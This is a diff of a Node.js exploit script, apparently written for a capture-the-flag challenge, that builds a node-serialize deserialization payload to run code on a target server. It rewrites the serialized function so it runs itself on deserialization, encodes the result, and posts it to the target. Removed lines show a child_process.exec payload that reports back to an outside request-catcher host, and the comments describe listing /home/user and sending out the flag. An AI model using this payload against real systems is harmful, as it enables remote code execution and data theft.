@@ -16,6 +16,7 @@ var urlencode = require('urlencode');
 // require('child_process').exec('ls / > nep10.txt', function(error, stdout, stderr) { return stdout; });
 // }();
 
+// First try - shell exec didnt work - Kept here to remember my shame!
 evil = {
   items: {
     '0': { name: 'Haworthiopsis attenuata', price: 19.99, count: 1 },
@@ -27,6 +28,11 @@ evil = {
   }
 }
 
+// Now were talking!
+
+// Kept the basic structure of the cart
+// First: listed files on /home/user dir
+// After: get flag in base64 format to send (owned!)
 evil2 = {
   items: {
     '0': { name: 'Haworthiopsis attenuata', price: 19.99, count: 1 },
@@ -67,17 +73,16 @@ evil2 = {
   }
 };
 
-// serious_evil=serialize.serialize(evil);
-
-// command = 'ls -l / > /tmp/nep10.txt';
-// returning = "require('request')('https://neptunian.requestcatcher.com/working', function (error, response, body) { console.log(body); });";
-
-// unevil = '{"items":{"0":{"name":"Haworthiopsis attenuata","price":19.99,"count":1},"1":{"name":"Dracaena trifasciata","price":14.99,"count":1},"2":{"name":"_$$ND_FUNC$$_function(){ require(\'child_process\').exec(\'' + command + '\', function(error, stdout, stderr) { ' + returning + ' });}()","price":14.99,"count":1}}}';
-
+// Lets serialize the payload
 let buff = new Buffer.from(serialize.serialize(evil2));
 
 console.log('Evil Serialized:');
 // buff2 = buff.toString('ascii');
+
+// Had to replace here to be automatic.
+// If I put the "()" and the end of the function, it will run and serialize the result!!
+// But if I put only in the serialized version, it will run only in the server, just after deserializing!
+// This way, I can work with a complete code, test the payload locally (below) and send it ready to the server.
 buff2 = buff.toString('ascii').replace('}","price', '}()","price');
 console.log(buff2 + '\n\n');
 
@@ -88,16 +93,12 @@ console.log(base64data + '\n\n');
 console.log('Evil URL Encoded:');
 let payload = urlencode(base64data);
 console.log(payload + '\n\n');
-// console.log(serious_evil);
-// console.log(obj.items[0].name);
 
+// Uncomment to test locally!
 // target_un = serialize.unserialize(buff2);
 
-// console.log('Check');
 
-// console.log(target_un.items['3'].name);
-
-
+// Lets send to the target
 var request = require('request');
 
 var headers = {
@@ -129,4 +130,5 @@ function callback(error, response, body) {
     }
 }
 
+// Just call it and go to request catcher to see the results!
 request(options, callback);
